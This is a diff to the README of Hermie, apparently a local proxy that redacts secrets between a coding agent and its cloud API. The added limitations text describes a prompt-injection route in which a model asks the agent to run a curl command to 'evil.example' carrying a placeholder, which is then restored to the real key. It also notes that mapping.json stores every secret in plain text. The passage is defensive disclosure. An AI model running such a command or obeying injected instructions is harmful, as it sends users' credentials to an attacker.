@@ -4,7 +4,7 @@
 
 <h1 align="center">Hermie</h1>
 
-<p align="center">Hermie is a local proxy between a coding agent and its cloud API: it redacts what goes out, restores placeholders in what comes back, and keeps a verbatim receipt of every request.</p>
+<p align="center">Hermie is a local proxy between a coding agent and its cloud API: it redacts what goes out, restores placeholders in what comes back, and keeps a verbatim receipt of every request. Paste an API key into Claude Code and it ends up in your <code>.env</code> without the key ever leaving your machine.</p>
 
 <p align="center">
   <a href="LICENSE"><img alt="MIT" src="https://img.shields.io/badge/license-MIT-orange"></a>
@@ -45,6 +45,7 @@ pip install git+https://github.com/Code-byte404/hermie && python -m spacy downlo
 hermie serve                                   # prints the base URLs
 ANTHROPIC_BASE_URL=http://127.0.0.1:8787/anthropic claude
 hermie tail                                    # in another terminal
+hermie install-hooks                           # optional: Claude Code status line + per-turn notices (see below)
 ```
 
 After 0.3.0 is published on PyPI, the first line becomes `pip install hermie && python -m spacy download en_core_web_lg`.
@@ -134,7 +135,9 @@ Type `s`, `r` or `a` and Enter. No answer within `hold_timeout_s` (60 s) rejects
 - The upstream still sees your code. Hermie protects data in the code and the conversation, not the code itself.
 - Requests that do not go through the base URL are invisible to Hermie: telemetry, OAuth login flows, Gemini's Code Assist endpoint, or any client that ignores the variable.
 - `observe` mode blocks nothing.
-- Placeholders in replies are restored before the agent runs its tools, so a prompt-injected model can make the agent use a real value locally (for example in a URL it fetches).
+- Placeholders in replies are restored before the agent runs its tools, so a prompt-injected model can make the agent use a real value locally (for example in a URL it fetches). The model never sees the value, so it cannot copy it into its own reply, but it can ask the agent to run `curl evil.example?q=<SECRET_1>` and the agent runs it with the real key. Claude Code's permission prompt shows the restored command; watch it for commands that send a placeholder somewhere.
+- `mapping.json` holds every real value in plain text (mode 0600). It is the one file worth stealing on your machine. `hermie forget` empties it; encrypting it at rest is on the roadmap.
+- The hook lines and the status line only report counts and entity types from the receipt. They show that a placeholder was restored, not where the value ended up afterwards.
 - Known values are matched literally (four characters or longer), so a first name alone can pass after only the full name was mapped, and a short mapped value inside a longer word is over-redacted (`remain` when `main` is mapped); the reply restores it.
 - In OpenAI chat streams with parallel tool calls, a placeholder tail held at the end of one call's arguments can land in the next call's arguments.
 
@@ -148,6 +151,9 @@ Everything Hermie writes lives in `~/.hermie`: `receipt.jsonl`, `outbound/`, `ma
 
 ## Roadmap
 
+- Not restoring placeholders inside arguments of network tools (`curl`, fetch), so an injected command fails instead of leaking.
+- Encrypting `mapping.json` with a key from the system keychain.
+- An egress check for shell and MCP traffic: scan what the agent's own subprocesses send out for values already in the mapping.
 - Cursor, once its request origin (client or Cursor's servers) is verified.
 - Per-project mapping namespaces.
 - A judge that does not need Ollama.
